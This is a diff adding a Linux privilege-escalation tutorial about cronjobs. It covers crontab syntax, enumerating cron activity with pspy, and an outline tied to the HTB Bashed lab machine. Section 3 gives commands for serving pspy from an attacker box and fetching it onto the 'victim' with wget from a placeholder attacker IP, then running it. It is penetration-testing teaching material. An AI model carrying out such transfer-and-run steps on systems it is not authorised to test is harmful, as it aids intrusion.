@@ -1,0 +1,132 @@
+                      ____________________________
+
+                       LINUX PRIVILEGE ESCALATION
+                       Linux Cronjob Enumeration
+
+                            Leonardo Tamiano
+                      ____________________________
+
+
+Table of Contents
+_________________
+
+1. What is a Cronjob?
+2. Cronjob Configuration
+3. Cronjob Enumeration
+4. Cronjob Exploitation
+
+
+1 What is a Cronjob?
+====================
+
+  In linux based systems, a `cronjob' is a command that is executed
+  periodically with a specified time rule.
+
+  These commands are typically used to manage a running environment with
+  tasks that need to be repeated every once in a while, such as backups,
+  certificate renewals, removing of temporary or junk files, restarting
+  of processes, and so on.
+
+  Understanding what kind of cronjobs are being executed in a system can
+  be extremely useful, especially if the cronjob configuration is
+  vulnerable.
+
+
+2 Cronjob Configuration
+=======================
+
+  To list out the cronjob configured for your user you can execute
+  ,----
+  | crontab -l
+  `----
+
+  To edit the cronjob configuration instead you can use
+  ,----
+  | crontab -e
+  `----
+
+  A typical cronjob entry looks as follows
+  ,----
+  | 0 9 15 2 * script.sh
+  `----
+
+  Where the various numbers taken together are used to specify the
+  timing information. That is, when exactly time-wise the command has to
+  be executed. Specifically, we have the following format
+  ,----
+  | MIN HOUR DOM MON DOW
+  `----
+
+  where
+  ,----
+  | MIN  -> minute
+  | HOUR -> hour
+  | DOM  -> day of the month
+  | MON  -> month
+  | DOW  -> day of the week
+  `----
+
+  For example, to execute a command on the 15th of feburary at 9:00 AM
+  you can use the following
+  ,----
+  | 0 9 15 2 *
+  `----
+
+
+3 Cronjob Enumeration
+=====================
+
+  In linux cronjob enumeration can be performed with the tool `pspy'.
+  - <https://github.com/DominicBreuker/pspy>
+
+  This tool analyses the `/proc' virtual file system that is generated
+  by the linux kernel in order to obtain information regarding currently
+  executing processes, which include cronjob processes.
+
+  To use it, first download the correct version depending on the
+  hardware architecture of your target
+  ,----
+  | wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 -O pspy32
+  | wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O pspy64
+  `----
+
+  Then transfer it to the victim machine
+  ,----
+  | python3 -m http.server 1337 # attacker
+  | wget http://<ATTACKER-IP>:1337/pspy32 -O /tmp/pspy32 # victim
+  | wget http://<ATTACKER-IP>:1337/pspy64 -O /tmp/pspy64 # victim
+  `----
+
+  Finally execute it
+  ,----
+  | ./pspy32
+  | ./psp64
+  `----
+
+
+4 Cronjob Exploitation
+======================
+
+  To see a practical enumeration and exploitation example of a cronjob,
+  consider the HTB Bashed machine.
+
+  Once inside the machine as `www-data', it is possible to pivot into
+  the `scriptmanager' user.
+
+  The next step is to enumerate the cronjobs. To this end, we can use
+  `pspy64'.
+
+  The steps to be taken are outlined below:
+
+  1. Enumerate arch to understand which binary we need
+
+  2. Download the right binary from github into the attacker box
+
+  3. Transfer it from attacker box to victim box
+
+  4. Execute it on victim box
+
+  5. Check output
+
+  Once we understand the command being executed by the cronjob we can
+  start to think of ways to exploiting it.
